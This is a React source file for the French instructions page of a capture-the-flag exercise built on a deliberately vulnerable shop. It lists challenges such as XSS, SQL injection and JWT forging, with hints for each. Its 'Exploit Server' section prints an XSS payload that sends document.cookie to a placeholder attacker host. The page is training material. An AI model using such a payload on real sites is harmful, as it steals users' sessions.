export default function Instructions() {
  const challenges = [
    { name: 'Sensitive Data Exposure', difficulty: 'facile', hint: 'Tout n\'est pas caché aux yeux du public...' },
    { name: 'IDOR', difficulty: 'facile', hint: 'Êtes-vous vraiment limité à votre propre profil ?' },
    { name: 'Reflected XSS', difficulty: 'moyen', hint: 'Que se passe-t-il quand on cherche quelque chose d\'inhabituel ?' },
    { name: 'SQL Injection', difficulty: 'moyen', hint: 'Le formulaire de connexion accepte peut-être plus que des noms d\'utilisateur...' },
    { name: 'Business Logic Flaw', difficulty: 'moyen', hint: 'Les nombres peuvent circuler dans les deux sens.' },
    { name: 'JWT Forging', difficulty: 'difficile', hint: 'Les secrets doivent rester secrets. Celui-ci l\'est-il ?' },
    { name: 'Stored XSS', difficulty: 'difficile', hint: 'Les avis sont affichés tels quels. Que pourriez-vous injecter ?' },
  ];

  const diffBadge = (d) => {
    if (d === 'facile') return 'badge-easy';
    if (d === 'moyen') return 'badge-medium';
    return 'badge-hard';
  };

  return (
    <div className="page-container max-w-4xl">
      {/* Hero */}
      <div className="text-center mb-16">
        <h1 className="text-5xl font-heading font-extrabold mb-4">
          <span className="gradient-text">BananaShop CTF</span>
        </h1>
        <p className="text-white/50 text-lg max-w-2xl mx-auto leading-relaxed">
          Cette plateforme e-commerce a été <span className="text-accent">rendue volontairement vulnérable</span>.
          Votre mission : trouver et exploiter les failles de sécurité pour capturer des flags.
        </p>
      </div>

      {/* How it works */}
      <div className="card p-8 mb-8">
        <h2 className="font-heading font-bold text-xl mb-6 text-cyan">Comment ça marche</h2>
        <div className="space-y-4 text-sm text-white/70 leading-relaxed">
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">1</span>
            <p>Explorez l'application BananaShop. Créez un compte, parcourez les produits, envoyez des crédits, rédigez des avis.</p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">2</span>
            <p>Trouvez les vulnérabilités et exploitez-les pour révéler des flags cachés au format <code className="font-mono text-accent bg-accent/10 px-2 py-0.5 rounded">CTF&#123;...&#125;</code></p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">3</span>
            <p>Soumettez vos flags sur la page <strong>Tableau de bord</strong>. Chaque flag valide rapporte un point à votre équipe au classement.</p>
          </div>
          <div className="flex gap-4">
            <span className="shrink-0 w-8 h-8 rounded-full bg-cyan/20 text-cyan flex items-center justify-center font-heading font-bold">4</span>
            <p>Utilisez votre <strong>Exploit Server</strong> pour recevoir les données exfiltrées (cookies, tokens). Il enregistre chaque requête HTTP reçue.</p>
          </div>
        </div>
      </div>

      {/* Challenges */}
      <div className="card p-8 mb-8">
        <h2 className="font-heading font-bold text-xl mb-6 text-accent">Défis</h2>
        <p className="text-white/40 text-sm mb-6">7 vulnérabilités à trouver. Chacune révèle un flag unique.</p>

        <div className="space-y-3">
          {challenges.map((c, i) => (
            <div key={i} className="flex items-center justify-between p-4 rounded-lg bg-white/[0.02] border border-white/[0.05]">
              <div className="flex items-center gap-4">
                <span className="font-mono text-white/20 text-sm w-6">#{i + 1}</span>
                <span className="font-heading font-semibold">{c.name}</span>
              </div>
              <div className="flex items-center gap-4">
                <span className="text-white/30 text-xs italic hidden md:block">{c.hint}</span>
                <span className={diffBadge(c.difficulty)}>{c.difficulty}</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Exploit Server */}
      <div className="card p-8 mb-8 border-terracotta/20">
        <h2 className="font-heading font-bold text-xl mb-6 text-terracotta">Exploit Server</h2>
        <div className="text-sm text-white/70 space-y-3 leading-relaxed">
          <p>Votre équipe dispose d'un serveur d'exploitation dédié qui agit comme récepteur de webhooks. Utilisez-le pour exfiltrer des données lors d'attaques XSS.</p>
          <div className="p-4 bg-white/[0.03] rounded-lg font-mono text-xs space-y-2">
            <p className="text-white/40"># Exemple : exfiltrer des cookies via XSS</p>
            <p className="text-accent">&lt;img src=x onerror="fetch('http://YOUR_EXPLOIT_SERVER/hook?c='+document.cookie)"&gt;</p>
          </div>
          <p>Accédez au tableau de bord de votre serveur d'exploitation pour voir les requêtes entrantes en temps réel.</p>
        </div>
      </div>

      {/* Recommended Tools */}
      <div className="card p-8">
        <h2 className="font-heading font-bold text-xl mb-6">Outils recommandés</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { name: 'Browser DevTools', desc: 'Inspectez les requêtes réseau, cookies, console (F12)' },
            { name: 'curl / Postman', desc: 'Envoyez des requêtes HTTP personnalisées à l\'API' },
            { name: 'jwt.io', desc: 'Décodez et forgez des JSON Web Tokens' },
            { name: 'Burp Suite', desc: 'Interceptez et modifiez le trafic HTTP (optionnel)' },
          ].map((tool, i) => (
            <div key={i} className="p-4 rounded-lg bg-white/[0.02] border border-white/[0.05]">
              <h3 className="font-heading font-semibold text-sm text-cyan mb-1">{tool.name}</h3>
              <p className="text-white/40 text-xs">{tool.desc}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
